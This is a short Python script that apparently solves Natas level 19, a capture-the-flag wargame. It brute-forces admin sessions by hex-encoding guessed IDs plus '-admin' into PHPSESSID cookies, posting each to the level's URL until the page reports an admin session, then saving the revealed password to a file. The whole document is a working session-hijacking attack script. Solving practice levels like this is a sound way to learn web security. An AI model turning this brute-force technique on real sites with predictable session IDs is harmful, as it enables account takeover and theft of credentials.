import requests
import utils

MAX_IDS = 640
LEVEL = 19


def obtain_credentials(session, url, auth, max_id):
    session_id = utils.str2hex(f"{max_id}-admin")
    cookies = {'PHPSESSID': session_id}
    r = session.post(url, auth=auth, cookies=cookies)
    print(max_id, end=', ')
    if "You are an admin" in r.text:
        return r.text
    return None


def main():
    url, auth = utils.get_natas_credentials(LEVEL)
    with requests.Session() as session:
        for max_id in range(281, MAX_IDS + 1):
            password = obtain_credentials(session, url, auth, max_id)
            if password:
                print(f"Found admin session ID: {max_id}")
                break

    utils.save_file('out.txt', password)


if __name__ == '__main__':
    main()
